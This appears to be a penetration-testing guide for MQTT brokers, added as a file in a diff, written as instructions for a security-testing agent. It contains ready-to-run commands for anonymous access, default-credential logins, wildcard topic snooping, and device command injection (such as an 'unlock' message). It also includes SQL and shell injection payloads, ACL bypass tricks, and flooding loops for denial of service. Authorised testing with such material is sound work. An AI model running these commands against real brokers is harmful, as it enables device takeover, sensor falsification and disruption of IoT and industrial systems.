@@ -1,0 +1,410 @@
+<mqtt_protocol_guide>
+<title>MQTT PROTOCOL SECURITY TESTING</title>
+
+<critical>MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol widely used in IoT, industrial systems, and real-time applications. Security vulnerabilities include unauthenticated access, topic injection, message manipulation, and broker misconfiguration. Many MQTT deployments lack basic security controls.</critical>
+
+<scope>
+- Broker authentication bypass
+- Topic enumeration and subscription
+- Message injection and manipulation
+- Authorization and ACL bypass
+- Retained message exploitation
+- Will message abuse
+- Protocol-level attacks (MQTT 3.1.1 vs 5.0)
+- TLS/SSL configuration issues
+</scope>
+
+<methodology>
+1. Identify MQTT broker and version.
+2. Test for unauthenticated access.
+3. Enumerate topics through wildcard subscriptions.
+4. Probe for message injection and manipulation.
+5. Test authorization controls on topics.
+</methodology>
+
+<protocol_basics>
+<mqtt_structure>
+{% raw %}
+# MQTT Connection:
+# Client connects to broker on port 1883 (plain) or 8883 (TLS)
+
+# Key concepts:
+# - Topics: Hierarchical paths (e.g., home/sensor/temperature)
+# - Publish: Send message to topic
+# - Subscribe: Receive messages from topic
+# - QoS: Quality of Service (0, 1, 2)
+# - Retained: Last message kept by broker
+# - Will: Message sent when client disconnects unexpectedly
+
+# Wildcards:
+# + : Single level (home/+/temperature matches home/bedroom/temperature)
+# # : Multi level (home/# matches home/bedroom/sensor/temperature)
+{% endraw %}
+</mqtt_structure>
+
+<connection_packet>
+{% raw %}
+# CONNECT packet components:
+- Protocol Name: "MQTT"
+- Protocol Level: 4 (MQTT 3.1.1) or 5 (MQTT 5.0)
+- Clean Session: true/false
+- Will Flag, QoS, Retain
+- Username/Password flags
+- Keep Alive: seconds
+- Client ID: unique identifier
+- Will Topic/Message (if Will Flag set)
+- Username/Password (if flags set)
+{% endraw %}
+</connection_packet>
+</protocol_basics>
+
+<reconnaissance>
+<broker_discovery>
+{% raw %}
+# Default ports:
+1883  # MQTT (unencrypted)
+8883  # MQTT over TLS
+8083  # MQTT over WebSocket
+8084  # MQTT over WSS
+
+# Network scanning:
+nmap -p 1883,8883,8083,8084 -sV target.com
+
+# Shodan queries:
+port:1883 mqtt
+product:mosquitto
+mqtt country:US
+
+# Common brokers:
+# - Mosquitto
+# - EMQX
+# - HiveMQ
+# - AWS IoT Core
+# - Azure IoT Hub
+{% endraw %}
+</broker_discovery>
+
+<broker_identification>
+{% raw %}
+# Connect and analyze CONNACK:
+mosquitto_sub -h target.com -p 1883 -t '#' -v
+
+# Error messages reveal broker type:
+# - Mosquitto error formats
+# - EMQX error formats
+# - Commercial broker signatures
+
+# Check for broker info topic:
+mosquitto_sub -h target.com -t '$SYS/#' -v
+# $SYS topics contain broker metrics and info
+{% endraw %}
+</broker_identification>
+</reconnaissance>
+
+<unauthenticated_access>
+<anonymous_connection>
+{% raw %}
+# Test anonymous connection:
+mosquitto_sub -h target.com -p 1883 -t '#' -v
+
+# If successful, broker allows anonymous access
+
+# Python test:
+import paho.mqtt.client as mqtt
+client = mqtt.Client()
+client.connect("target.com", 1883)
+# No username/password = anonymous
+{% endraw %}
+</anonymous_connection>
+
+<weak_credentials>
+{% raw %}
+# Common weak credentials:
+mosquitto_sub -h target.com -u admin -P admin -t '#'
+mosquitto_sub -h target.com -u mqtt -P mqtt -t '#'
+mosquitto_sub -h target.com -u guest -P guest -t '#'
+mosquitto_sub -h target.com -u user -P password -t '#'
+
+# Default credentials by broker:
+# Mosquitto: anonymous by default
+# EMQX: admin/public
+# HiveMQ: varies by installation
+{% endraw %}
+</weak_credentials>
+</unauthenticated_access>
+
+<topic_enumeration>
+<wildcard_subscription>
+{% raw %}
+# Subscribe to all topics:
+mosquitto_sub -h target.com -t '#' -v
+
+# Subscribe to all topics under path:
+mosquitto_sub -h target.com -t 'home/#' -v
+
+# Single-level wildcard:
+mosquitto_sub -h target.com -t '+/sensor/+' -v
+
+# System topics (broker info):
+mosquitto_sub -h target.com -t '$SYS/#' -v
+{% endraw %}
+</wildcard_subscription>
+
+<topic_discovery>
+{% raw %}
+# Common topic patterns:
+/devices/{device_id}/telemetry
+/sensors/{sensor_type}/data
+/home/{room}/{device}
+/commands/{device_id}
+/status/{device_id}
+/config/{device_id}
+/firmware/{device_id}
+
+# Sensitive topics:
+/credentials/*
+/auth/*
+/admin/*
+/debug/*
+/internal/*
+{% endraw %}
+</topic_discovery>
+
+<sys_topics>
+{% raw %}
+# $SYS broker information topics:
+$SYS/broker/version
+$SYS/broker/uptime
+$SYS/broker/clients/connected
+$SYS/broker/clients/total
+$SYS/broker/messages/received
+$SYS/broker/messages/sent
+$SYS/broker/subscriptions/count
+$SYS/broker/load/messages/received/1min
+{% endraw %}
+</sys_topics>
+</topic_enumeration>
+
+<message_injection>
+<publish_attacks>
+{% raw %}
+# Inject commands to devices:
+mosquitto_pub -h target.com -t 'device/123/command' -m '{"action": "unlock"}'
+
+# Inject false sensor data:
+mosquitto_pub -h target.com -t 'sensor/temperature' -m '{"value": 999}'
+
+# Inject to admin topics:
+mosquitto_pub -h target.com -t 'admin/config' -m '{"debug": true}'
+
+# Retained message injection (persists until overwritten):
+mosquitto_pub -h target.com -t 'topic' -m 'malicious' -r
+{% endraw %}
+</publish_attacks>
+
+<payload_attacks>
+{% raw %}
+# Malformed payloads:
+mosquitto_pub -h target.com -t 'device/cmd' -m '{invalid json}'
+
+# Oversized payloads (DoS):
+mosquitto_pub -h target.com -t 'topic' -m "$(python -c 'print("A"*1000000)')"
+
+# Injection in JSON payload:
+mosquitto_pub -h target.com -t 'api/query' -m '{"query": "'; DROP TABLE--"}'
+
+# Command injection:
+mosquitto_pub -h target.com -t 'device/exec' -m '$(id)'
+{% endraw %}
+</payload_attacks>
+</message_injection>
+
+<will_message_abuse>
+<will_exploitation>
+{% raw %}
+# Will message: sent when client disconnects unexpectedly
+
+# Set malicious will message:
+import paho.mqtt.client as mqtt
+client = mqtt.Client()
+client.will_set("status/device123", "offline", qos=1, retain=True)
+# Will message published if connection drops
+
+# Abuse scenarios:
+# 1. Set will to high-priority alert topic
+# 2. Inject false status updates
+# 3. Trigger automated responses
+
+# DoS via will message spam:
+# Connect many clients with wills, disconnect all
+{% endraw %}
+</will_exploitation>
+</will_message_abuse>
+
+<authorization_bypass>
+<acl_testing>
+{% raw %}
+# Test topic ACL restrictions:
+
+# Subscribe to restricted topic:
+mosquitto_sub -h target.com -u user1 -P pass1 -t 'admin/#'
+# Check if subscription denied
+
+# Publish to restricted topic:
+mosquitto_pub -h target.com -u user1 -P pass1 -t 'admin/config' -m 'test'
+# Check if publish denied
+
+# ACL bypass attempts:
+# - Case variations: Admin/config vs admin/config
+# - Unicode normalization
+# - Path traversal: ../admin/config
+{% endraw %}
+</acl_testing>
+
+<topic_confusion>
+{% raw %}
+# Topic name manipulation:
+# Null byte injection:
+topic\x00/hidden
+admin\x00bypass
+
+# Unicode tricks:
+admin/config  vs  аdmin/config (Cyrillic 'а')
+
+# Path separator confusion:
+admin/config vs admin//config vs admin/./config
+
+# Wildcard in publish (if allowed):
+mosquitto_pub -t '+' -m 'broadcast'
+{% endraw %}
+</topic_confusion>
+</authorization_bypass>
+
+<mqtt_5_features>
+<mqtt5_attacks>
+{% raw %}
+# MQTT 5.0 specific features:
+
+# User Properties:
+# Can inject arbitrary metadata
+client.publish("topic", "msg", properties={"user": "admin"})
+
+# Content Type manipulation:
+# Mislead consumers about payload format
+
+# Response Topic:
+# Redirect responses to attacker-controlled topic
+
+# Subscription Identifiers:
+# Manipulate message routing
+
+# Topic Aliases:
+# Confuse topic resolution
+{% endraw %}
+</mqtt5_attacks>
+</mqtt_5_features>
+
+<denial_of_service>
+<dos_attacks>
+{% raw %}
+# Connection exhaustion:
+for i in range(10000):
+    client = mqtt.Client(f"client_{i}")
+    client.connect("target.com")
+
+# Message flooding:
+while True:
+    client.publish("topic", "A" * 1000000)
+
+# Subscription overload:
+for i in range(10000):
+    client.subscribe(f"topic/{i}/#")
+
+# Retained message spam:
+for i in range(10000):
+    client.publish(f"spam/{i}", "retained", retain=True)
+{% endraw %}
+</dos_attacks>
+</denial_of_service>
+
+<tls_issues>
+<tls_testing>
+{% raw %}
+# Test TLS configuration:
+
+# Check for plain MQTT (no TLS):
+mosquitto_sub -h target.com -p 1883 -t '#'
+
+# Check certificate validation:
+mosquitto_sub -h target.com -p 8883 --cafile /dev/null -t '#'
+# Should fail if properly configured
+
+# Test with self-signed cert:
+mosquitto_sub -h target.com -p 8883 --insecure -t '#'
+
+# Check for TLS downgrade:
+# Offer weak ciphers and check acceptance
+{% endraw %}
+</tls_testing>
+</tls_issues>
+
+<common_payloads>
+{% raw %}
+# Anonymous subscription:
+mosquitto_sub -h target.com -t '#' -v
+
+# Topic enumeration:
+mosquitto_sub -h target.com -t '$SYS/#' -v
+
+# Message injection:
+mosquitto_pub -h target.com -t 'device/cmd' -m '{"action": "malicious"}'
+
+# Retained message:
+mosquitto_pub -h target.com -t 'topic' -m 'persistent' -r
+
+# ACL bypass:
+mosquitto_sub -h target.com -t '../admin/#' -v
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate unauthenticated access with topic subscription.
+2. Show message injection affecting device behavior.
+3. Prove topic enumeration revealing sensitive information.
+4. Document ACL bypass for restricted topic access.
+5. Provide evidence of broker configuration exposure via $SYS topics.
+</validation>
+
+<false_positives>
+- Broker requires strong authentication
+- ACLs properly configured per user/topic
+- TLS enforced with certificate validation
+- Wildcard subscriptions blocked
+- $SYS topics restricted
+</false_positives>
+
+<impact>
+- Unauthorized access to IoT device communications
+- Device control through command injection
+- Sensor data manipulation
+- Privacy breach through message interception
+- Industrial system compromise
+- Infrastructure sabotage
+- Denial of service
+</impact>
+
+<pro_tips>
+1. Always test for anonymous access first.
+2. Wildcard '#' subscription reveals all traffic.
+3. $SYS topics expose broker internals.
+4. Retained messages persist and affect new subscribers.
+5. Will messages can trigger on controlled disconnection.
+6. IoT deployments often lack authentication.
+7. Topic names may contain sensitive information.
+8. MQTT 5.0 has additional attack vectors via properties.
+9. WebSocket MQTT may have different security than raw MQTT.
+10. Check for both 1883 (plain) and 8883 (TLS) ports.
+</pro_tips>
+
+<remember>MQTT security is often neglected in IoT deployments. Unauthenticated brokers expose all message traffic to any subscriber. Topic-based authorization is frequently misconfigured or absent. Always test wildcard subscriptions and message injection capabilities.</remember>
+</mqtt_protocol_guide>
